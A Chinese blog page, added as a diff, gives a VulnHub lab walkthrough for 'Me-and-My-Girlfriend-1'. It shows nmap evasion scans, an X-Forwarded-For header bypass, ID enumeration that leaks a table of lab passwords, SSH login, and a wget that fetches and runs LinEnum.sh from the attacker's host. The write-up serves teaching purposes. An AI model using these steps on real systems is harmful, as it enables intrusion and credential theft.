@@ -1,0 +1,1051 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是一个来自 VulnHub 的靶机项目。 **靶机地址：**https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;me-and-my-girlfriend-1,409&#x2F; **难度级别：**Beginner 注：共有 2 个flag 靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub Me-and-My-Girlfriend-1">
+<meta property="og:url" content="http://example.com/2026/test42/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是一个来自 VulnHub 的靶机项目。 **靶机地址：**https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;me-and-my-girlfriend-1,409&#x2F; **难度级别：**Beginner 注：共有 2 个flag 靶机">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159835.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159168.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159874.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159869.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159685.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159630.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159499.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159533.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159924.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159117.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159556.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200869.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200719.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200468.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200352.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200385.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200182.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200791.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200859.png">
+<meta property="article:published_time" content="2026-04-15T10:16:02.837Z">
+<meta property="article:modified_time" content="2026-04-15T14:00:44.348Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="vlunhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159835.png">
+  
+  
+  
+  <title>vulnhub Me-and-My-Girlfriend-1 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub Me-and-My-Girlfriend-1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnhub Me-and-My-Girlfriend-1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p>这是一个来自 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/">VulnHub</a> 的靶机项目。</p>
+<p>**靶机地址：**<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p>
+<p>**难度级别：**Beginner</p>
+<p>注：共有 2 个flag</p>
+<p><strong>靶机描述：</strong></p>
+<blockquote>
+<p>This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company!</p>
+<p>该虚拟机围绕一对情侣 Alice 和 Bob 展开故事设定。两人原本感情甜蜜，但自从 Alice 入职一家名为 “Ceban Corp” 的私营公司后，她的态度逐渐发生变化，似乎隐藏着某些秘密。Bob 希望你能够协助调查，找出 Alice 所隐瞒的真相，并最终获取该公司的完整访问权限。</p>
+</blockquote>
+<p>由于是课程作业，要求复现WP，所以本靶机我们将进行两轮攻击：</p>
+<ol>
+<li>第一轮：复现 Writeup（WP）的方法操作，完成课程要求。</li>
+<li>第二轮：结合自身理解与技巧，尝试更高效或独特的解决方案。</li>
+</ol>
+<h1 id="第一轮"><a href="#第一轮" class="headerlink" title="第一轮"></a>第一轮</h1><blockquote>
+<p>这一轮复现WP，解题步骤及描述仅作简单调整</p>
+</blockquote>
+<p>首先不知道靶机的IP，netdiscover（kali自带的基于ARP协议的网段扫描工具）发现靶机IP：192.168.100.128</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdiscover</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159835.png" srcset="/img/loading.gif" lazyload alt="image-20251211133023979"></p>
+<p>nmap进行扫描一波，发现开放SSH以及80。</p>
+<p>SSH端口先放过它，基本没有弱口令，等有相关用户名密码再来搞它，去80端口看看。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">p</span>- -<span class="hljs-selector-tag">A</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.128</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>-p-</code>：扫描目标主机 <strong>1–65535 全端口</strong>（TCP）。</p>
+</li>
+<li><p><code>-A</code>：启用“高级检测”(“aggressive”模式)，包括：</p>
+<ul>
+<li>服务版本探测（<code>-sV</code>）</li>
+<li>操作系统识别（<code>-O</code>）</li>
+<li>默认脚本扫描（<code>-sC</code>，相当于 <code>--script=default</code>）</li>
+<li>traceroute</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159168.png" srcset="/img/loading.gif" lazyload alt="image-20251211133449597"></p>
+<p><strong>nmap常用参数</strong></p>
+<ul>
+<li><code>-sS</code>：TCP SYN扫描（半开放，隐蔽、速度快，需要root权限）</li>
+<li><code>-sT</code>：TCP连接扫描（不需要root，速度较慢且容易被检测）</li>
+<li><code>-sU</code>：UDP扫描（用于UDP端口，但慢且不一定能准确识别）</li>
+<li><code>-p</code>：指定扫描端口或端口范围（如 <code>-p 80,443</code> 或 <code>-p 1-1000</code>）</li>
+<li><code>-A</code>：启用高级功能，包含操作系统检测、版本探测、脚本扫描和路由跟踪</li>
+<li><code>-sV</code>：服务版本检测，识别端口上运行的服务及版本号</li>
+<li><code>-O</code>：操作系统探测</li>
+<li><code>-Pn</code> 或 <code>-P0</code>：无主机发现，跳过ping，适合目标禁ping情况下</li>
+<li><code>-sn</code>：仅做主机发现，不扫描端口</li>
+<li><code>-T0 ~ -T5</code>：时序模板，调节扫描速度（T4&#x2F;T5为快速，T0为超慢）</li>
+<li><code>-iL</code>：从文件读取目标主机列表</li>
+<li><code>-oN</code>、<code>-oX</code>、<code>-oG</code>：输出格式（普通文本&#x2F;XML&#x2F;grep-able）</li>
+<li><code>--script</code>：执行NSE脚本，支持漏洞、服务、协议自动化检测</li>
+<li><code>-n</code>&#x2F;<code>-R</code>：禁用&#x2F;总是进行DNS解析</li>
+<li><code>-v</code>&#x2F;<code>-vv</code>：显示详细过程</li>
+<li><code>-f</code>：分片攻击，逃避防火墙检测</li>
+<li><code>--min-rate</code>：设置最小包发送速率，加速扫描</li>
+</ul>
+<p><strong>常用场景命令举例</strong></p>
+<ol>
+<li><strong>快速端口扫描，查开放端口</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># SYN扫描、扫描前1000常见端口，速度快，隐蔽性好</span><br><span class="hljs-attribute">nmap</span> -sS -p <span class="hljs-number">1</span>-<span class="hljs-number">1000</span> <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>综合信息收集（服务+版本+操作系统）</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 全面评估目标，得端口、服务、版本、操作系统，配合T4加速，适合渗透/安全初查</span><br><span class="hljs-attribute">sudo</span> nmap -sS -sV -O --top-ports <span class="hljs-number">1000</span> -T4 <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>全端口扫描（不遗漏隐藏服务）</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 扫描所有65535端口，并跳过ping，加速，适合深度排查关键主机</span><br><span class="hljs-attribute">sudo</span> nmap -sS -p- --min-rate <span class="hljs-number">5000</span> -T4 -Pn <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>主机发现</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 仅查活跃主机，不扫端口，适合绘制内网主机地图</span><br><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>服务版本及漏洞快速扫描</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 扫指定端口服务版本并用NSE脚本找公开漏洞，适合快速脆弱性筛查</span><br><span class="hljs-attribute">nmap</span> -sV --script vuln -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><strong>高危服务专项扫描（如SMB&#x2F;HTTP&#x2F;SSH等）</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 对Windows/Samba/WEB进行枚举，为渗透做准备</span><br><span class="hljs-attribute">nmap</span> --script smb-enum-shares,smb-enum-users -p <span class="hljs-number">445</span> <span class="hljs-number">192.168.1.1</span><br><span class="hljs-attribute">nmap</span> --script http-enum,http-headers -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span> <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><strong>规避防火墙&#x2F;检测IDS</strong></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 慢速、分片、源端口伪装、多IP欺骗，提高隐蔽性，适合防火墙严密场景</span><br><span class="hljs-attribute">sudo</span> nmap -sF -T2 --scan-delay <span class="hljs-number">500</span>ms -f --data-length <span class="hljs-number">16</span> -D RND:<span class="hljs-number">10</span>,ME -g <span class="hljs-number">53</span> <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure>
+
+<p>扫扫目录，目录以及文件没有有用信息，只能从80找突破口。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirsearch -u http:<span class="hljs-string">//192.168.100.128/</span> -e <span class="hljs-string">.txt</span>,php,html,json<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159874.png" srcset="/img/loading.gif" lazyload alt="image-20251211135029754"></p>
+<p>访问&#x2F;robots.txt</p>
+<blockquote>
+<p>User-Agent: *<br>Allow: &#x2F;heyhoo.txt</p>
+</blockquote>
+<p>然后访问&#x2F;heyhoo.txt，</p>
+<blockquote>
+<p>Great! What you need now is reconn, attack and got the shell</p>
+</blockquote>
+<p>这里是提示我们信息收集、发动攻击，然后拿到 shell。</p>
+<p>看看misc目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.128</span><span class="hljs-regexp">/misc/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159869.png" srcset="/img/loading.gif" lazyload alt="image-20251211135503451"></p>
+<p>看看config目录</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.128</span><span class="hljs-regexp">/config/</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159685.png" srcset="/img/loading.gif" lazyload alt="image-20251211135533245"></p>
+<p>回到根目录，访问后页面显示允许本地登录。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159630.png" srcset="/img/loading.gif" lazyload alt="image-20251211135713354"></p>
+<p>这是知识点了，要改xff头。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">X</span>-Forwarded-For: localhost<br></code></pre></td></tr></table></figure>
+
+<p>这里在bp里添加xff头</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159070.png" srcset="/img/loading.gif" lazyload alt="image-20251211141954946"></p>
+<p>修改完之后我们就进来了。</p>
+<p>这结构必须试一试SQL注入和本地包含，之前找到的两个目录下还有两个PHP文件，也许有东西。</p>
+<p>但是经过测试发现，不存在SQL注入和本地包含，这条路是死了。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.100.128/?page=index</span><br></code></pre></td></tr></table></figure>
+
+<p>可以注意到有主页、登录、注册、等功能，但是我们不能登录。那就先注册一个。</p>
+<p>登录之后又看到了熟悉的参数试一试有没有注入,发现还是没有。</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://192.168.100.128/<span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">page</span>=dashboard<span class="hljs-variable">&amp;user_id</span>=13<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159499.png" srcset="/img/loading.gif" lazyload alt="image-20251211142736750"></p>
+<p>看看profile</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159533.png" srcset="/img/loading.gif" lazyload alt="image-20251211143236393"></p>
+<p>转念一想，看看传个别的ID值看看什么情况。13没有，也就是说我们是最后一个。</p>
+<p>看看11也是没有。但是到1之后就又有了。也就说意味着我们可以 得到这些用户的账号密码。哎呦？可以遍历一下。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159093.png" srcset="/img/loading.gif" lazyload alt="image-20251211143530850"></p>
+<p>可以得到6组密码，有的没有，有的有。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159993.png" srcset="/img/loading.gif" lazyload alt="image-20251211143747060"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159924.png" srcset="/img/loading.gif" lazyload alt="image-20251211143730547"></p>
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eweuhtandingan</td>
+<td>skuyatuh</td>
+</tr>
+<tr>
+<td>aingmaung</td>
+<td>qwerty!!!</td>
+</tr>
+<tr>
+<td>sundatea</td>
+<td>indONEsia</td>
+</tr>
+<tr>
+<td>sedihaingmah</td>
+<td>cedihhihihi</td>
+</tr>
+<tr>
+<td>alice</td>
+<td>4lic3</td>
+</tr>
+<tr>
+<td>abdikasepak</td>
+<td>dorrrrr</td>
+</tr>
+</tbody></table>
+<p>这不就有了用户名和密码，回手掏，去干SSH得到账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; users.txt &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">eweuhtandingan</span><br><span class="hljs-string">aingmaung</span><br><span class="hljs-string">sundatea</span><br><span class="hljs-string">sedihaingmah</span><br><span class="hljs-string">alice</span><br><span class="hljs-string">abdikasepak</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; passwords.txt &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">skuyatuh</span><br><span class="hljs-string">qwerty!!!</span><br><span class="hljs-string">indONEsia</span><br><span class="hljs-string">cedihhihihi</span><br><span class="hljs-string">4lic3</span><br><span class="hljs-string">dorrrrr</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159664.png" srcset="/img/loading.gif" lazyload alt="image-20251211144404340"></p>
+<p>SSH找到第一个flag</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> alice@<span class="hljs-number">192.168.100.128</span><br><span class="hljs-comment"># 密码：4lic3</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200535.png" srcset="/img/loading.gif" lazyload alt="image-20251211144625538"></p>
+<p>起服务，拉脚本</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python2</span> -m SimpleHTTPServer<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">wget http:<span class="hljs-comment">//192.168.100.129:8000/LinEnum.sh</span><br>chmod 777 LinEnum.<span class="hljs-keyword">sh</span><br>./LinEnum.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159117.png" srcset="/img/loading.gif" lazyload alt="image-20251211145016022"></p>
+<p>找到突破点，我们之可以root权限执行PHP命令的得到shell找到第二个flag</p>
